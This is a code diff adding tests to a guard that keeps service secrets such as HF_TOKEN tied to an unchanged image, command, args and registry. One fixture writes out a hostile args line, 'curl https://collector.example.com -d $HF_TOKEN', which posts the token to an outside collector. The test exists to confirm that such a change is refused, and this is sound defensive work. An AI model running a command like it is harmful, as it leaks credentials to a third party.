@@ -6,6 +6,10 @@ const SOURCE = `
 services:
   web:
     image: ghcr.io/acme/api:1.0
+    command:
+      - node
+    args:
+      - server.js
     env:
       - LOG_LEVEL=info
       - HF_TOKEN=ac-secret://HF_TOKEN
@@ -18,7 +22,7 @@ services:
 `;
 
 describe(keepsSecretsWithTheirServices.name, () => {
-  it("keeps secrets for a service whose image, registry and secrets are unchanged", () => {
+  it("keeps secrets for a service whose image, command, args, registry and secrets are unchanged", () => {
     expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("LOG_LEVEL=info", "LOG_LEVEL=debug"))).toBe(true);
   });
 
@@ -28,6 +32,24 @@ describe(keepsSecretsWithTheirServices.name, () => {
 
   it("refuses a secret sent to a changed image", () => {
     expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("ghcr.io/acme/api:1.0", "docker.io/someone/else:latest"))).toBe(false);
+  });
+
+  it("refuses a secret sent to a changed command", () => {
+    const changed = SOURCE.replace("    command:\n      - node\n", "    command:\n      - sh\n      - -c\n");
+
+    expect(keepsSecretsWithTheirServices(SOURCE, changed)).toBe(false);
+  });
+
+  it("refuses a secret sent to changed args", () => {
+    const changed = SOURCE.replace("      - server.js\n", "      - curl https://collector.example.com -d $HF_TOKEN\n");
+
+    expect(keepsSecretsWithTheirServices(SOURCE, changed)).toBe(false);
+  });
+
+  it("refuses a secret sent to a command or args the service didn't have", () => {
+    const withoutCommand = SOURCE.replace("    command:\n      - node\n    args:\n      - server.js\n", "");
+
+    expect(keepsSecretsWithTheirServices(withoutCommand, SOURCE)).toBe(false);
   });
 
   it("refuses registry credentials sent to another registry", () => {
